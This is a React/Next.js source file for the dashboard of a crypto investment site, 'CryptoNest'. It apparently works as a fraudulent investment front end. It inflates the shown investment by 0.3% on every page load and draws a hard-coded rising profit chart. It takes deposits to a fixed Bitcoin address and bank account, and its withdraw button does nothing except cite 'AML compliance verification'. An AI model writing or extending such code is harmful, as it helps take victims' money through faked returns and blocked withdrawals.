import { useState, useEffect } from "react";
import { useRouter } from "next/router";
import { Line } from "react-chartjs-2";
import axiosClient from "../services/axiosClient";

import {
  Chart as ChartJS,
  LineElement,
  PointElement,
  LinearScale,
  CategoryScale,
  Tooltip,
  Filler,
} from "chart.js";

ChartJS.register(LineElement, PointElement, LinearScale, CategoryScale, Tooltip, Filler);

export default function Dashboard() {
  const router = useRouter();

  const [balance, setBalance] = useState(0);
  const [invested, setInvested] = useState(0);
  const [amount, setAmount] = useState("");
  const [modal, setModal] = useState(null);
  const [depositMethod, setDepositMethod] = useState(null);
  const [copied, setCopied] = useState(false);

  const BTC_ADDRESS = "bc1qf5gz0g0mdjz0a5c84r2qjnhcvqsnnvp046g2cf";
  const BANK_DETAILS = `
Routing number: 121146177
Swift code: CLNOU59
Bank address: 1 Letterman Dr, San Francisco, CA 23451
Account #: 692101393999
Full name: Trewin Trades LLC
  `;

  useEffect(() => {
    const load = async () => {
      try {
        // ✅ Fetch portfolio using VPS backend
        const res = await axiosClient.get(`${process.env.NEXT_PUBLIC_API_URL}/portfolio`, {
          withCredentials: true,
        });

        const balanceNum = Number(res.data.balance) || 0;
        const investedNum = Number(res.data.invested) || 0;

        setBalance(balanceNum);
        setInvested(Number((investedNum * 1.003).toFixed(2)));
      } catch (err) {
        router.replace("/login");
      }
    };
    load();
  }, []);

  const closeModal = () => {
    setModal(null);
    setAmount("");
    setDepositMethod(null);
    setCopied(false);
  };

  const confirmInvest = () => {
    const value = Number(amount);
    if (!value || value <= 0 || value > balance) return;
    setBalance(balance - value);
    setInvested(invested + value);
    closeModal();
  };

  const chartData = {
    labels: Array.from({ length: 14 }, (_, i) => `Day ${i + 1}`),
    datasets: [
      {
        data: [980, 990, 1002, 998, 1010, 1025, 1030, 1028, 1040, 1055, 1060, 1072, 1085, 1100],
        borderColor: "#22c55e",
        backgroundColor: "rgba(34,197,94,0.15)",
        fill: true,
        tension: 0.35,
        pointRadius: 0,
      },
    ],
  };

  return (
    <div className="min-h-screen bg-black text-white px-4 sm:px-8">
      {/* NAV */}
      <nav className="flex justify-between items-center py-4 border-b border-gray-800 max-w-6xl mx-auto">
        <h1 className="text-green-400 font-bold text-xl sm:text-2xl">CryptoNest</h1>
        <button
          onClick={async () => {
            await axiosClient.post(`${process.env.NEXT_PUBLIC_API_URL}/auth/logout`, {}, {
              withCredentials: true,
            });
            router.replace("/login");
          }}
          className="text-gray-400 hover:text-white text-sm sm:text-base"
        >
          Logout
        </button>
      </nav>

      {/* MAIN */}
      <main className="max-w-6xl mx-auto py-8 space-y-8 sm:space-y-10">
        {/* Portfolio Overview */}
        <div>
          <p className="text-gray-400 text-sm sm:text-base">Total Portfolio Value</p>
          <h2 className="text-2xl sm:text-4xl font-bold mt-1">
            ${(balance + invested).toFixed(2)}
          </h2>

          <p className="text-xs sm:text-sm text-gray-500 mt-2">
            Balance: ${balance.toFixed(2)} · Invested: ${invested.toFixed(2)}
          </p>

          <div className="mt-6 bg-gray-900 p-4 sm:p-6 rounded-xl border border-gray-800 h-[220px] sm:h-[280px]">
            <Line
              data={chartData}
              options={{
                maintainAspectRatio: false,
                plugins: { legend: { display: false } },
                scales: { x: { display: false }, y: { display: false } },
              }}
            />
          </div>
        </div>

        {/* Actions */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 sm:gap-6">
          <Action title="Deposit" onClick={() => setModal("deposit")} />
          <Action title="Withdraw" onClick={() => setModal("withdraw")} />
          <Action title="Invest" onClick={() => setModal("invest")} />
        </div>
      </main>

      {/* MODAL */}
      {modal && (
        <Modal title={modal.toUpperCase()} onClose={closeModal}>
          <div className="relative mb-4">
            <span className="absolute left-4 top-3 text-gray-400">$</span>
            <input
              type="number"
              inputMode="decimal"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0.00"
              className="w-full pl-8 py-3 bg-black border border-gray-700 rounded-lg text-white text-sm sm:text-base focus:outline-none focus:border-green-500"
            />
          </div>

          {/* Deposit */}
          {modal === "deposit" && amount && (
            <>
              {!depositMethod && (
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <button
                    onClick={() => setDepositMethod("btc")}
                    className="p-4 border border-gray-700 rounded-lg hover:border-green-400"
                  >
                    Bitcoin
                  </button>
                  <button
                    onClick={() => setDepositMethod("bank")}
                    className="p-4 border border-gray-700 rounded-lg hover:border-green-400"
                  >
                    Bank Transfer
                  </button>
                </div>
              )}
              {depositMethod && (
                <div className="mt-4">
                  <div className="bg-black border border-gray-700 rounded-lg p-3 max-h-40 overflow-y-auto">
                    <pre className="text-green-400 text-xs sm:text-sm whitespace-pre-wrap">
                      {depositMethod === "btc" ? BTC_ADDRESS : BANK_DETAILS}
                    </pre>
                  </div>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(
                        depositMethod === "btc" ? BTC_ADDRESS : BANK_DETAILS
                      );
                      setCopied(true);
                    }}
                    className="mt-3 w-full bg-gray-800 py-2 rounded text-sm sm:text-base"
                  >
                    {copied ? "Copied" : "Copy Details"}
                  </button>
                  <button
                    onClick={closeModal}
                    className="mt-3 w-full bg-green-500 text-black py-3 rounded-lg text-sm sm:text-base"
                  >
                    Confirm once sent
                  </button>
                </div>
              )}
            </>
          )}

          {/* Withdraw */}
          {modal === "withdraw" && (
            <>
              <p className="text-yellow-400 text-xs sm:text-sm mt-2">
                Withdrawals are subject to AML compliance verification.
              </p>
              <button className="mt-4 w-full bg-red-500 text-black py-3 rounded-lg text-sm sm:text-base">
                Confirm Withdrawal
              </button>
            </>
          )}

          {/* Invest */}
          {modal === "invest" && (
            <button
              onClick={confirmInvest}
              className="mt-4 w-full bg-green-500 text-black py-3 rounded-lg text-sm sm:text-base"
            >
              Confirm Investment
            </button>
          )}
        </Modal>
      )}
    </div>
  );
}

/* COMPONENTS */
function Action({ title, onClick }) {
  return (
    <button
      onClick={onClick}
      className="bg-gray-900 border border-gray-800 rounded-xl p-4 sm:p-6 text-base sm:text-lg hover:border-green-400 transition"
    >
      {title}
    </button>
  );
}

function Modal({ title, children, onClose }) {
  return (
    <div className="fixed inset-0 bg-black bg-opacity-70 flex items-end sm:items-center justify-center z-50 px-4">
      <div className="bg-gray-900 border border-gray-800 p-6 sm:p-8 rounded-t-xl sm:rounded-xl w-full sm:max-w-md relative">
        <h2 className="text-lg sm:text-xl font-bold mb-4">{title}</h2>
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-400 hover:text-white"
        >
          ✕
        </button>
        {children}
      </div>
    </div>
  );
}


